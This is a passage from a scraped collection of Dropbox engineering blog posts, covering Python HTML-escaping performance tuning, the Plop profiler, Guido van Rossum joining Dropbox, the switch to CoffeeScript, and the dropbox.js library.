that.\r\n   \"\"\"\r\n  \r\n    # Ensure we deal with strings\r\n    s = unicode(s)\r\n  \r\n    pieces = []\r\n    for char in s:\r\n        if char in WHITELIST:\r\n            pieces.append(char)\r\n        else:\r\n            pieces.append(\"&#%02x;\" % ord(char))\r\n  \r\n    return UNSAFE_bless(\"\".join(pieces)) # Now it’s escaped, so should be safe This has a pretty good 15% or so improvement: : html2 12.8864150047 Implicit Loops Now, the preceding code sample maybe isn't too pretty, but the improvement is nothing worth sneering at. There's more we can do though. The second fact of Python optimization is that the loop overhead can also be pretty significant. This leads to our second attempt, which gets rid of the loop in favor of a generator expression. Fortunately, switching to generator expressions makes the resulting function as readable as the original. Copy def html3(s):\r\n    \"\"\"\r\n   Escapes a string for inclusion into tag contents in HTML.\r\n  \r\n   Do *not* use for including a string into an HTML attribute; use\r\n   escape.attr() for that.\r\n   \"\"\"\r\n  \r\n    # Ensure we deal with strings\r\n    s = unicode(s)\r\n  \r\n    escaped = \"\".join(\r\n        c if c in WHITELIST\r\n        else \"&#%02x;\" % ord(c)\r\n        for c in s)\r\n  \r\n    return UNSAFE_bless(escaped) # Now it’s escaped, so should be safe What are the timings with this new version? : html3 13.4748219418 Hmm. The readability improvements are nice, but the speed dropped. Maybe we can get both speed and reability with some tweaks? More Optimizations We already picked out a neat 10% improvement and still have a wonderfully readable function. But we can go faster... Generators?? Really? The problem with the generator expressions used above is that Python actually constructs a generator. Let's look at the bytecode: Copy >>> import dis\r\n>>> dis.dis(optimization_story.html3)\r\n…\r\n 78          12 LOAD_CONST               1 (”)\r\n             15 LOAD_ATTR                1 (join)\r\n  \r\n 79          18 LOAD_CONST               2 (<code object <genexpr> at 0x1005dddc8, file \"./optimization_story.py\", line 79>)\r\n             21 MAKE_FUNCTION            0\r\n  \r\n 81          24 LOAD_FAST                0 (s)\r\n             27 GET_ITER            \r\n             28 CALL_FUNCTION            1\r\n             31 CALL_FUNCTION            1\r\n             34 STORE_FAST               1 (escaped)\r\n… Luckily, we can avoid making the generator by simply using a list comprehension instead of a generator expression: Copy def html4(s):\r\n    #…\r\n    escaped = \"\".join([\r\n        c if c in WHITELIST\r\n        else \"&#%02x;\" % ord(c)\r\n        for c in s])\r\n    #… This brings us back to faster than html2 . : html4 11.2531888485 Looks like the generator expression is actually slower than the list comprehension in this case, a good explanation is probably that our sample set of strings are probably too small to reap the benefits of using a generator. As expected, our disassembly now looks a lot more friendly: Copy 97          12 LOAD_CONST               1 (”)\r\n             15 LOAD_ATTR                1 (join)\r\n  \r\n 98          18 BUILD_LIST               0\r\n             21 DUP_TOP            \r\n             22 STORE_FAST               1 (_[1])\r\n  \r\n100          25 LOAD_FAST                0 (s)\r\n             28 GET_ITER            \r\n        >>   29 FOR_ITER                43 (to 75)\r\n             32 STORE_FAST               2 (c)\r\n             35 LOAD_FAST                1 (_[1])\r\n             38 LOAD_FAST                2 (c)\r\n             41 LOAD_GLOBAL              2 (WHITELIST)\r\n             44 COMPARE_OP               6 (in)\r\n             47 JUMP_IF_FALSE            7 (to 57)\r\n             50 POP_TOP            \r\n             51 LOAD_FAST                2 (c)\r\n             54 JUMP_FORWARD            14 (to 71)\r\n        >>   57 POP_TOP            \r\n             58 LOAD_CONST               2 (‘&#%02x;’)\r\n             61 LOAD_GLOBAL              3 (ord)\r\n             64 LOAD_FAST                2 (c)\r\n             67 CALL_FUNCTION            1\r\n             70 BINARY_MODULO      \r\n        >>   71 LIST_APPEND        \r\n             72 JUMP_ABSOLUTE           29\r\n        >>   75 DELETE_FAST              1 (_[1])\r\n             78 CALL_FUNCTION            1\r\n             81 STORE_FAST               3 (escaped) Sets?? Really? But this is still slower than it should be. One low-hanging fruit still stands out: why are we doing a linear search on the whitelist? Copy WHITELIST2 = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\" The timings bear out the guess that sets are faster than strings: : html5 8.6205868721 The question remains, Can we go faster? Deeper Python Optimization If we're going to optimize this function, we might as well extract all the performance we possibly can. One peculiarity of modern Python is that it has two LOAD instructions: LOAD_GLOBA L and LOAD_FAST . Due to a implementation detail loading a local variable is faster than loading a global variable. Consequently, you want to avoid global variables in tight loops. The above disassembly pointed to two such globals: ord and WHITELIST . Copy def html6(s):\r\n    # …\r\n    lord = ord; lWHITELIST2 = WHITELIST2\r\n    escaped = \"\".join([\r\n        c if c in lWHITELIST2\r\n        else \"&#%02x;\" % lord(c)\r\n        for c in s])\r\n    #… We don't expect this to buy us much, but why not? : html6 7.87281298637 In absolute measurement a second is not much of an improvment but as a percentage it's still a significant of time. String Interpolation String interpolation is another thing Python isn't very fast at. Let's see if removing that helps. Copy def html7(s):\r\n    # …\r\n    lstr = str; lord = ord; lWHITELIST2 = WHITELIST2\r\n    escaped = \"\".join([\r\n        c if c in lWHITELIST2\r\n        else \"&#\" + lstr(lord(c)) + \";\"\r\n        for c in s])\r\n    # … : html7 5.58323383331 That's a huge boost from saving the string interpolation! Every Problem Can be Solved With a Big Enough Hash Table Any web programmer knows that performance problems can be universally solved with caching. (Heh heh, if only...) In any case, if the gain from removing string interpolation was so great, maybe we can just cache the results of that characters to escaped form: function, and not do string concatenation either. We'll set up a cache of characters to HTML escapes: Copy CACHE_HTML_ESCAPES = {} Then we read and write our cache as necessary: Copy def html8(s):\r\n    # …\r\n    escaped = \"\".join([\r\n        c if c in lWHITELIST2\r\n        else CACHE_HTML_ESCAPES.get(c) or CACHE_HTML_ESCAPES.setdefault(c, \"&#\" + lstr(lord(c)) + \";\")\r\n        for c in s])\r\n    # … Since our web servers are long-running processes, the cache should eventually capture all of the characters people are using; Python’s dicts are then fast enough to give us a speed boost over string concatenation and =str(ord(c))=. : html8 4.5724029541 Another big boost from avoid what seems like a trivial computation. Premature Optimization… If we’re going down the setdefault branch so rarely, and since that’s the only place we’re using str and ord, maybe it’s not worth making those local variables? Copy def html9(s):\r\n    # …\r\n    lWHITELIST2 = WHITELIST2\r\n    escaped = \"\".join([\r\n        c if c in lWHITELIST2\r\n        else CACHE_HTML_ESCAPES.get(c) or CACHE_HTML_ESCAPES.setdefault(c, \"&#\" + str(ord(c)) + \";\")\r\n        for c in s]) We don’t expect much of a benefit here, but maybe a percent change or so… : html9 4.565928936 Wait, Why a Python Loop At All? Wait, why are we using a Python loop at all? Python loops are slow… Instead, maybe we can use the C code in Python’s re module? We can use regexes to find anything that isn’t in our whitelist, and do the replacement. That way, the “do-nothing” operation on whitelisted characters becomes much cheaper. Copy import re\r\nRE_FIND_NON_WHITELISTED = re.compile(\"([^\" + \"\".join(WHITELIST2) + \"])\") Unfortunately, there’s no way to get the entire matched range from a Python match object. So we’re forced to call the group method– and function calls are slow! Copy def htmlA(s):\r\n    # …\r\n    escaped = RE_FIND_NON_WHITELISTED.sub(\r\n        lambda m: CACHE_HTML_ESCAPES.get(m.group(1))\r\n               or CACHE_HTML_ESCAPES.setdefault(m.group(1), \"&#\" + str(ord(m.group(1)))) + \";\",\r\n        s)\r\n    # … What are our results? : htmlA 4.54020690918 Hmm, this isn’t that great, actually. We did save a percentage point, but this is a lot less readable (at least, in my opinion) than html9, and the gains aren’t worth it. Until, that is, we try it on whitelisted-only text: : html9 3.84376811981 : htmlA 0.796116113663 Whoosh! html9 got a bit faster, by virtue of avoiding hitting the cache at all, but the regex-based solution *rocked*, since it could do all of the skipping of characters in C, not Python. In fact, the regex-based solution is slower for punctuation, since it has to do multiple function calls instead of just one function call and dictionary lookup. And for short strings, the overhead to initiating the regex search is worse. Let’s try a test on punctuation-heavy, short text snippets: : html9 1.59476995468 : htmlA 3.44844794273 Measure Twice, Cut Once So we have one function that’s faster for English alphanumeric text and one that’s faster for everything else. But we can’t just shaft our non-US users, and we don’t want to settle for a function that’s five times slower for the common case! So we have a few options. The first is simply to expand our whitelist — most file names have a dot in them, and spaces, dashes, and similar are popular. At signs appear in emails. And so on. Of course, one has to be careful not to permit any XSS vector while doing so; but a conservative expansion by adding -|!,. _ to our whitelist should be safe. Of course, this helps both versions, so it’s not really a fix. Another fix presents itself, though: can we figure out which version of html to use quickly? Copy def htmlB(s):\r\n    # …\r\n  \r\n    non_whitelisted = RE_FIND_NON_WHITELISTED.findall(s)\r\n    if len(non_whitelisted) > .6 * len(s):\r\n        escaped = RE_FIND_NON_WHITELISTED.sub(\r\n            lambda m: CACHE_HTML_ESCAPES.get(m.group(1))\r\n                or CACHE_HTML_ESCAPES.setdefault(m.group(1), \"&#\" + str(ord(m.group(1)))) + \";\",\r\n            s)\r\n    else:\r\n        lWHITELIST2 = WHITELIST2\r\n        escaped = \"\".join([\r\n                c if c in lWHITELIST2\r\n                else CACHE_HTML_ESCAPES.get(c) or CACHE_HTML_ESCAPES.setdefault(c, \"&#\" + str(ord(c)) + \";\")\r\n                for c in s])\r\n  \r\n    # … Why .6, you ask? Well, the exact constant isn’t too important (the function *works* whichever way the test goes, it’s just an optimization), but some testing showed it to be the approximate break-even point of the two methods. With hope and trepidation, we run the tester… : htmlB 5.16241598129 : html9 3.97228693962 : htmlA 3.95208191872 Awww… As we hoped, the result is fast on whitelisted-only characters… : htmlB 1.24477005005 : html9 3.41327309608 : htmlA 0.696345090866 And is passable on punctuation: : htmlB 5.97420597076 : html9 3.61161899567 : htmlA 8.88924694061 But the overhead is pretty saddening… Sampling We can improve things a bit by testing just a few characters for punctuation/unicode. Copy def htmlC(s):\r\n    # …\r\n    non_whitelisted = RE_FIND_NON_WHITELISTED.findall(s[:10])\r\n    if len(whitelisted) < 6:\r\n    # … We use =6= instead of =.6 * min(10, len(s))= because if the string is shorter than 10 characters, either alternative is going to be fast. This leads to a marked improvement. For alphanumeric strings: : htmlC 0.836707115173 : html9 3.34154415131 : htmlA 0.701889276505 For unicode-heavy strings: : htmlC 3.70150613785 : html9 2.82831597328 : htmlA 6.77485609055 This is now really looking like an option for production use. But checking is still quite a bit of overhead still– in the case where the user has just about the break-even balance of English and international characters, we’re looking at a 20% premium. Can we do better? The User is Always Right Well, so checking which to use has very high overhead. What to do? Well, we’ve got to think about when each case will come up: how might we predict that lots of non-English-alphanumerics are going to come up? What users are likely to store files with international names, or use an international name? (Hopefully, people who use lots of punctuation in both are few…) Well luckily, Dropbox added translations a bit back, so we already have all of the infrastructure in place to detect what locale a user is from. So a quick optimization is to switch to the html9 version (the list-comprehension-based one) for international users, and use the fast htmlA version (regexes) for US-based users, and also users from countries with mostly-Latin alphabets. The code here is mostly tied to Dropbox internals, so I’m not going to show it, but I’m sure you get the point. This final optimization removes the check overhead while giving us most of the benefit. Success! What We Didn’t Do Now there are some ways to optimize the above even further. The obvious approach is to rewrite the entire thing in C. This lets us squeeze the last bits of performance out of the above, but it would also make things much harder to maintain. Similarly, using PyPy or a similar JIT would probably help on the inner loop of the pure-Python version, likely making it as fast as the regex-based approach. Conclusions The first, most basic conclusion is that the basic facts of Python optimization inline functions, use implicit loops, move computation into C if possible are perfectly valid. Another fact: Python dictionaries are *fast*. The WHITELIST set and the CACHE_HTML_ESCAPES dict both rely on the superb hash table implementation for their performance gains. Other “common wisdom”, like using locals instead of globals, yields relatively little gain. Optimizing inner loops in a high-level loops requires lots of trial and error. It was absolutely amazing that moving to string concatenation from string interpolation gave such a huge boost to performance. Finally, measurement is key. It was measurement that told us that HTML escaping was slow to begin with; and without measuring performance, we would never have guessed that string interpolation was so slow. Thanks for reading! // Tags Application Python // Copy link Link copied Link copied", "date": "2011-10-24"},
{"website": "Dropbox", "title": "Plop: Low-overhead profiling for Python", "author": ["Ben Darnell"], "link": "https://dropbox.tech/application/plop-low-overhead-profiling-for-python", "abstract": "How it works It's almost time for another Hack Week at Dropbox, and with that in mind I'd like to present one of the projects from our last Hack Week. A profiler is an indispensable tool for optimizing programs.  Without a profiler, it's hard to tell which parts of the code are consuming enough time to be worth looking at.  Python comes with a profiler called cProfile, but enabling it slows things down so much that it's usually only used in development or simulated scenarios, which may differ from real-world usage. At our last hack week, I set out to build a profiler that would be usable on live servers without impacting our users.  The result, Plop (Python Low Overhead Profiler) is now available on Github . How it works Plop is a sampling profiler, similar to Google's gperftools .  Every 10 milliseconds, a timer is fired which causes the program to record its current stack trace.  After 30 seconds, the collected samples are aggregated and saved.  There is a web-based viewer for the resulting call graphs (using d3.js ) Here's a sample profile, from a simple Tornado -based web server. Click on the image for a full-size interactive view (it's big, so you'll need to either scroll around a lot or use your browser's zoom controls). Each bubble is a function; they're color-coded by filename and you can mouse over them for more details. The size of the bubble represents the amount of time spent in that function.  The thickness of the lines connecting the bubbles represents how frequently that function call appears on the stack.  The disconnected bubbles around the edge are actually common utility functions that are called from many places throughout the code - they're so common that drawing the connections to every function that calls them would make the graph unreadable. Since hack week, we've integrated Plop into our servers and run it regularly.  Every time we push new code to the site, a script collects a profile for the new version.  This has proven not to be disruptive, with less than 2% CPU overhead while the profile is being collected. It's still a work in progress (especially the viewer), but has already proven useful in identifying performance regressions. // Tags Application // Copy link Link copied Link copied", "date": "2012-07-10"},
{"website": "Dropbox", "title": "Welcome Guido!", "author": ["Drew Houston"], "link": "https://dropbox.tech/application/welcome-guido", "abstract": "Today we’re excited to welcome a new member of the Dropbox family under unusual circumstances. Though he's joining us now, his contributions to Dropbox date back to day one, all the way to the very first lines of code . Some people only need to be introduced by their first name, and the BDFL is one of them. Dropbox is thrilled to welcome Guido , the creator of the Python programming language and a long-time friend of ours. From the beginning, it was clear that Dropbox had to support every major operating system. Historically, doing so presented a serious challenge for developers: because each platform required different development tools and programming languages, developers had to write the same code multiple times. We didn't have time for that, and fortunately Python came to the rescue. Several years earlier, Python became my favorite programming language because it had a balance of simplicity, flexibility, and elegance . These qualities of Python, and the community’s work to support every major platform, let us write the code just once before running it everywhere. They have also influenced our greater design philosophy at Dropbox as we set out to build a simple product that brings your life together. It’s been five years since our first prototype was saved as dropbox.py, and Guido and the Python community have been crucial in helping us solve interesting challenges for more than 100 million people . So we welcome Guido to Dropbox with admiration and gratitude. Guido inspires all of us and has played a critical part in how Dropbox ties together the products, devices and services in your life. We're delighted to have him as part of the team. // Tags Application Open Source // Copy link Link copied Link copied", "date": "2012-12-07"},
{"website": "Dropbox", "title": "Dropbox dives into CoffeeScript", "author": ["Dan Wheeler"], "link": "https://dropbox.tech/application/dropbox-dives-into-coffeescript", "abstract": "Before and after shots Statistics Methodology Going Forward Thanks During July's Hackweek, the three of us rewrote Dropbox's full browser-side codebase to use CoffeeScript instead of JavaScript, and we've been really happy with how it's been going so far. This is a controversial subject, so we thought we'd start by explaining why. CoffeeScript: JavaScript: By the way, the JavaScript has a scoping bug, did you catch it?? We've heard many arguments against CoffeeScript. Before diving in, we were most concerned about these two: That it adds extra bloat to iterative development, because each tweak requires recompilation . In our case, we avoided this problem entirely by instrumenting our server code: whenever someone reloads a Dropbox page running on their development server, it compare mtimes between .coffee files and compiled .js equivalents. Anything needing an update gets compiled. Compilation is imperceptibly fast thanks to jashkenas and team . This means we didn't need to change our workflow whatsoever, didn't need to learn a new tool, or run any new background process (no coffee --watch ). We just write CoffeeScript, reload the page, loop. That debugging compiled js is annoying . It's not, and the main reason is CoffeeScript is just JavaScript: it's designed to be easy to debug, in part by leaving JavaScript semantics alone. We've heard many arguments for and against debuggability, and in the end, we convinced ourselves that it's easy only after jumping in and trying it. We converted and debugged about 23,000 lines of JavaScript into CoffeeScript in one week without many issues. We took time to test the change carefully, then slowly rolled it out to users. One week after Hackweek had ended, it was fully launched. Probably the most misleading argument we hear against CoffeeScript goes something like this: If you like Python or Ruby, go for CoffeeScript — it's really just a matter of syntactic preference . This argument frustrates us, because it doesn't consider history . Stick with us for a minute: April 1995: Brendan Eich, a SICP enthusiast, joins Netscape with the promise of bringing Scheme to the browser. He's assigned to other projects in the first few months that he joins. Java launches in the meantime and explodes in popularity. Later in '95: Scheme is off the table. Upper management tasks Eich with creating a language that is to Java as VBScript is to C++, meant for amateurs doing simple tasks, the idea being that self-respecting pros would be busy cranking out Java applets. In Eich's words : JS had to \"look like Java\" only less so, be Java's dumb kid brother or boy-hostage sidekick. Plus, I had to be done in ten days or something worse than JS would have happened. Imagine Bruce Campbell Brendan Eich as he battled sleep deprivation to get a prototype out in 10 days, all the while baking his favorite concepts from Scheme and Self into a language that, on the surface, looked completely unrelated. LiveScript is born. It launches with Netscape Navigator 2.0 in September '95. December '95: For reasons that are probably marketing-related and definitely ill-conceived, Netscape changes the name from LiveScript to JavaScript in version 2.0B3. August '96: Microsoft launches IE 3.0, the first version to include JavaScript support. Microsoft calls their version \"JScript\" (presumably for legal reasons). November '96: ECMA (Now Ecma) begins standardization. Netscape and Microsoft argue over the name. The result is an even worse name. Quoting Eich , ECMAScript \"was always an unwanted trade name that sounds like a skin disease.\" Especially considering the strange, difficult and rushed circumstances of its origin, JavaScript did many things well: first class functions and objects, prototypes, dynamic typing, object literal syntax, closures, and more. But is it any surprise that it got a bunch of things wrong too? Just considering syntax, things like: obscuring prototypical OOP through confusingly classical syntax, the var keyword (forgot var ? congrats, you've got a global!), automatic type coercion and == vs === , automatic semicolon insertion woes , the arguments object (which acts like an array except when it doesn't), and so on. Before any of these problems could be changed, JavaScript was already built into competing browsers and solidified by an international standards committee. The really bad news is, because browsers evolve slowly, browser-interpreted languages evolve slowly. Introducing new iteration constructs, adding default arguments, slices, splats, multiline strings, and so on is really difficult. Such efforts take years , and require cooperation among large corporations and standards bodies. Our point is to forget CoffeeScript's influences for a minute, because it fixes so many of these syntactic problems and at least partially breaks free of JavaScript's slow evolution; even if you don't care for significant whitespace, we recommend CoffeeScript for so many other reasons. Disclaimer : we love Python, and it's Dropbox's primary language, so we're probably biased. An interesting argument against CoffeeScript from Ryan Florence , that seemed plausible to us on first impression but didn't hold up after we thought more about it, is the idea that (a) human beings process images and symbols faster than words, so (b) verbally readable code isn't necessarily quicker to comprehend. Florence uses this to argue that (c) while CoffeeScript may be faster to read, JavaScript is probably faster to comprehend. We'd expect cognitive science provides plenty of evidence in support of (a), including the excellent circle example cited by Florence. (b) is easily proven by counterexample . Making the leap to (c) is where we ended up disagreeing: For the most part CoffeeScript isn’t trading symbols for words — it’s dropping symbols. Highly repetitive symbols like , ; {} () . We believe such symbols mostly add syntactic noise that makes code harder to read. CoffeeScript introduces new symbols! For example, (a,b,c) -> ... instead of function (a,b,c) {...}. Along with being shorter to type, we think this extra notation makes code easier to comprehend, similar to how math is often better explained through notation instead of words. Consider one example where CoffeeScript does in fact swap a symbol for a word: || vs or. Is || really analogous to the circle in Florence’s example, with or being the verbal description of that circle? This needs the attention of a cognitive scientist, but our hunch is || functions more linguistically than it does symbolically to most readers, acting as a stand-in for the word or . So in this case we expect something more like the reverse of the circle example: we think || and or are about equally readable, but would give slight benefit to CoffeeScript’s or, as it replaces a stand-in for or with or itself. Humans are good at mapping meanings to symbols, but there’s nothing particularly or -esque about ||, so we suspect it adds a small amount of extra work to comprehend. On to some code samples. Before and after shots JavaScript Copy if (files) {\r\n  BrowseDrag._update_status_position(e, files);\r\n} else if (e.dataTransfer &&\r\n           e.dataTransfer.types &&\r\n           e.dataTransfer.types.contains('Files')) {\r\n  CrossDomainUploader.show_drop_indicators(e);\r\n} CoffeeScript Copy if files\r\n  @_update_status_position e, files\r\nelse if e.dataTransfer?.types?.contains 'Files'\r\n  CrossDomainUploader.show_drop_indicators e JavaScript Copy this.originalStyle = {};\r\n['top', 'left', 'width', 'height'].each(function (k) {\r\n  this.originalStyle[k] = this.element.style[k];\r\n}.bind(this)); CoffeeScript Copy @originalStyle = {}\r\nfor k in ['top', 'left', 'width', 'height']\r\n  @originalStyle[k] = @element.style[k] JavaScript Copy Sharing = {\r\n  init: function (sf_info) {\r\n    [sf_info.current, sf_info.past].each(function (list) {\r\n      list.each(function (info) {\r\n        Sharing._decode_sort_key(info);\r\n      });\r\n    });\r\n  }\r\n} CoffeeScript Copy Sharing =\r\n  init: (sf_info) ->\r\n    for list in [sf_info.current, sf_info.past]\r\n      for info in list\r\n        @_decode_sort_key info We'll let this comparison speak for itself. We consider it our strongest argument in favor of CoffeeScript. Statistics JavaScript CoffeeScript Lines of code 23437 18417 Tokens 75334 66058 Characters 865613 65993 In the process of converting, we shaved off more than 5000 lines of code, a 21% reduction. Granted, many of those lines looked like this: Copy });\r\n    });\r\n  }\r\n} Regardless, fewer lines is beneficial for simple reasons — being able to fit more code into a single editor screen, for example. Measuring reduction in code complexity is of course much harder, but we think the stats above, especially token count, are a good first-order approximation. Much more to say on that subject. In production, we compile and concatenate all of our CoffeeScript source into a single JavaScript file, minify it, and serve it to browsers with gzip compression. The size of the compressed bundle didn’t change significantly pre- and post-coffee transformation, so our users shouldn’t notice anything different. The site performs and behaves as before. Methodology Rewriting over 23,000 lines of code in one (hack)week was a big undertaking. To significantly hasten the process and avoid bugs, we used js2coffee , a JavaScript to CoffeeScript compiler, to do all of the repetitive conversion tasks for us (things like converting JS blocks to CS blocks, or JS functions to CS functions). We'd start converting a new JS file by first compiling it individually to CS, then manually editing each line as we saw fit, improving style along the way, and making it more idiomatic. One example: the compiler isn't smart enough to convert a JS three-clause for into a CS for/in . Instead it outputs a CS while with i++ at the end. We switched each of those to simpler loops. Another example: using string interpolation instead of concatenation in places where it made sense. To make sure we didn't break the site, we used a few different approaches to test: Jasmine for unit testing. We built a fuzz tester with Selenium . It takes a random walk across the website looking for exceptions. Give it enough time, and it theoretically should catch 'em all 😉 Tons of manual testing. Going Forward Dropbox now writes all new browser-side code in CoffeeScript, and we've been loving it. We've already written several thousand new lines of coffee since launching in July. Some of the things we're looking to improve in the future: Browser support for CoffeeScript source maps , so we can link JavaScript exceptions directly to the source code, and debug CoffeeScript live. Native CoffeeScript support in browsers, so that during development, we can avoid the compilation to JavaScript altogether. Thanks To Brendan Eich and Jeremy Ashkenas for creating two fantastic languages. // Tags Application Open Source Frontend CoffeeScript // Copy link Link copied Link copied", "date": "2012-09-13"},
{"website": "Dropbox", "title": "Some love for JavaScript applications", "author": ["Victor Costan"], "link": "https://dropbox.tech/application/some-love-for-javascript-applications-2", "abstract": "Motivation: static Web applications Demo: “powered by Dropbox” Web applications dropbox.js: designed to make developers happy dropbox.js stays out of your way dropbox.js is easy to hack Tough decisions The story of dropbox.js Go forth and hack! During our last hack week, Aakanksha Sarda and I set out to build a library that helps JavaScript developers use the Dropbox API . My main goal was to take “static” Web applications to the next level. However, the JavaScript library can be useful for any application that runs a significant part of its logic in the browser, as well as for node.js server-side code. If you prefer getting your hands dirty right away, go ahead and register for a Dropbox API key , set up an application in your Dropbox , borrow sample code , and read the library documentation . Motivation: static Web applications Thanks to recent improvements in browser support and VM performance, I often find myself writing small and medium applications completely in JavaScript, whenever I can get away with it. JavaScript runs on users’ browsers, so all the application’s files are static, and can be served by any plain old file server such as nginx , pretty much any Web hosting service, and your humble Dropbox . My interest in static Web apps is greatly influenced by how easy they are to deploy. For example, the deployment process for my Dropbox-hosted applications is the cp command (copy if you’re on Windows). Dropbox syncs the files to its servers, and even lets me revert a bad deployment . I’ve been using this beautiful, simple paradigm for all my applications that don’t need to store per-user data. However, up until now, having to handle per-user data has been a different story. I needed a database to store the data and an application server to talk to the database server. My applications then needed accounts and authentication to ensure that users wouldn’t overwrite each others’ data. Finally, deploying a new version of the application involved pulling the updated code from a git repository, migrating the database schema, and restarting the application server. I was afraid I’d make a mistake, so I ended up writing complex scripts to handle the deployment. To my despair, the code for having small applications store per-user data was much longer than the actual application code. Deploying the apps was a problem on its own, and left me yearning for the minimalistic “ copy to Dropbox ” approach. Fortunately, today’s announcement fixes everything! Demo: “powered by Dropbox” Web applications My hack week project, dropbox.js , makes it easy to use Dropbox for storing per-user data. For example, let’s consider Checkbox , a To Do manager hosted entirely in this Dropbox folder . While Checkbox won’t be winning design or usability awards any time soon, it is fully functional! It can store your To Do list right in your Dropbox, in less than 70 lines of HTML and less than 300 lines of commented CoffeeScript (which compiles into less than 350 lines of JavaScript). Let’s skim the Checkbox source code . The action happens in the app’s CoffeeScript code . The Checkbox class is the application’s view and controller, so it renders the UI and handles DOM events. The Tasks and Task classes implement the data model and the Dropbox integration. Checkbox uses the “App folder” Dropbox access level , so Dropbox automatically creates a directory for my app data in my users’ Dropboxes. The data model design favors ease of development and debugging. Each task is stored as a file whose name is the task’s description. Tasks are grouped under two folders, active and done. Operations on tasks cleanly map to Dropbox file operations in Dropbox. For example: to initialize the task database, create two folders, active and done (implemented by the mkdir calls in the load method in the Tasks class) to create a task named “Buy milk”, create the empty file “active/Buy milk” (implemented by addTask in the Tasks class) to mark a task as completed, move its file from the active folder into the done folder (implemented by setTaskDone in the Tasks class) to remove a task, delete its file from the user’s Dropbox (implemented by removeTask in the Tasks class) to list all the user’s tasks, read the contents of the active and done folders (implemented by the readdir calls in the load method in the Tasks class) Most importantly, each Dropbox operation takes up one line of code in the Tasks implementation. Thanks to dropbox.js, the Checkbox source code is all about the application’s logic, and does not get distracted with infrastructure issues. In the end, dropbox.js makes it easy for me to store my users’ data in a system whose features and reliability go beyond those of the storage backing many enterprise-grade applications. Checkbox-managed To Do lists are transmitted securely , stored redundantly , and backed up . My own To Do lists are in my Dropbox, so I debugged my application with my file manager, and deployed it using cp. I have never SSHed into a server, and I haven’t issued a single SQL query. Want in on the action? This little JavaScript application can help you run small Web applications out of your Dropbox! dropbox.js: designed to make developers happy Hopefully, I’ve convinced you to try out dropbox.js for your next prototype or hobby project. In fact, I won’t be offended if you stop reading now and start using it! However, I think you’ll also find it interesting to read more about the goals, tough decisions, and story behind the library’s design. Let’s start with the goals: dropbox.js stays out of your way I think that infrastructure libraries should silently support your development efforts, and stay out of your way. Every bit of brainpower lost on figuring out low-level issues is not spent on making your application awesome. So the overarching goal for dropbox.js is to have you spend as little time as possible thinking about it. To that end, the libraries aims to follow the principle of least surprise , and to make the common use cases especially easy to implement. For example, the interfaces of the methods for reading and writing Dropbox files heavily borrow from fs.readFile and fs.writeFile in node.js, as you can see in the code below. Copy // Inefficient way of copying a file.\r\nclient.readFile(“source.txt”, function(error, data) {\r\n    client.writeFile(“destination.txt”, data, function (error) {\r\n        console.log(“Done copying.”);\r\n    });\r\n}); Dropbox has more features than your average filesystem, such as revision history, and these advanced features can be accessed by passing an options object. For example, the same readFile method can be used to retrieve an old revision of a file. Copy client.readFile(“source.txt”, { versionTag: “0400000a” },\r\n            function(error, data) {\r\n    console.log(“Done copying.”);\r\n}); However, passing an options object is not mandatory, and the default options reflect the common use case, such as reading the most recent revision of a file. Compare and contrast with the Win32 CreateFile function, which takes 7 parameters. Last but not least, the library’s interface acknowledges both experienced JavaScript programmers and experienced Dropbox API users. For example, listing a folder’s contents can be done by calling a readdir method, whose interface matches fs.readdir , or by calling a metadata method, whose interface is closer to the /metadata REST API . dropbox.js is easy to hack I really hope that dropbox.js works out of the box for you, and helps you integrate with Dropbox quickly and painlessly. At the same time, I realize that a small library can’t possibly cover all the use cases, and some of you will have to extend or modify the library. The library exposes some of its internals on purpose, so you can break the abstractions when you need to. For example, methods that make AJAX calls, such as readFile and writeFile, return the XmlHttpRequest object used for the AJAX call. If you want to implement progress bars for Dropbox operations, you can set up listeners for the relevant XmlHttpRequest events. To further encourage extension, the library’s internal methods are fully documented using JSDoc, just like the public APIs. Asides from source code, dropbox.js includes an automated build script, and a mostly-automated test suite with very solid coverage. If you need to modify the library, the README file will help you use the test suite to verify the correctness of your changes and incorporate your changes in a minified library build or an npm package. The entire library is hosted on GitHub, so you can easily submit your patches and not get stuck maintaining a fork. Tough decisions Perhaps the most delicate aspect of integrating with a Web service is the user authentication piece. Dropbox authentication uses a four-step process that bounces the user between the application’s Web page and the Dropbox servers, so applications will most likely need to customize the process. dropbox.js defines an authentication driver interface for the custom code, and also includes three implementations that will get you going through the prototype stage of your application. For example, the code below covers both library initialization and authentication. Copy var appKey = { key: “api-key”, secret: “api-secret”, sandbox: true };\r\nvar client = new Dropbox.Client(appKey);\r\nclient.authDriver(new Dropbox.Drivers.Redirect());\r\nclient.authenticate(function(error, data) {\r\n    if (error) { return showError(error); }\r\n    doSomethingUseful(client);  // The user is now authenticated.\r\n}); While writing the JavaScript library, I struggled a lot figuring out how much I can diverge from the Dropbox REST API , in the name of offering a more intuitive API. While I didn’t want to create a RequestProcessorFactoryFactory -like monster, I also wanted to hide some aspects of the REST API that I found confusing.  For example, the JavaScript library wraps the /metadata output, and uses the stat name for the concept of metadata, to match existing filesystem APIs. The rev parameter that shows up in many API calls is renamed to revisionTag in dropbox.js , to avoid the misconception that its value would be a sequential integers, like Subversion revisions. I look forward to seeing how this decision plays out, and to learning from it. When I started working on the JavaScript library, I envisioned that the Dropbox object would implement a high-level API, and developers would only call into Dropbox.Client if they would need a low-level API. I had high hopes for the high-level API. It was supposed to provide File and Directory classes, automatically cache Dropbox data in IndexedDb , and automatically kick off the authentication process on token expiration. Unfortunately, by the end of the hack week, the low-level API was barely completed, so the current dropbox.js release ships an empty Dropbox object, and the code samples use Dropbox.Client . Ship early, ship often 🙂 The story of dropbox.js dropbox.js was designed and developed during the most recent Dropbox hack week, a hackathon where we put our regular work on hold for 5 days and get to work on our crazy ideas and pet projects. I got the idea to write a JavaScript client for the Dropbox API when I brainstormed for hack week projects, and I realized that all my ideas would be best prototyped as JavaScript applications. At first, I had many doubts about the idea. Would other people use this? Would I be able to make a decent API? Fortunately, I shared my idea with a few colleagues, who encouraged me to commit to the idea and post it to the company’s internal list of hack week projects. After posting the project, I received an amazing (and humbling) amount of support from fellow Dropboxers. Before hack week, Chris Varenhorst added CORS headers to the Dropbox API responses, which allow dropbox.js to work in the browser. During hack week, Aakanksha Sarda fleshed out the code for all the file operations, figured out how to deal with binary files (e.g., images), got the automated test suite running in the browser, and wrote Dropstagram, a Dropbox-powered photo-editing application, using WebGL shaders. A few other Dropboxers used dropbox.js and gave us great feedback and 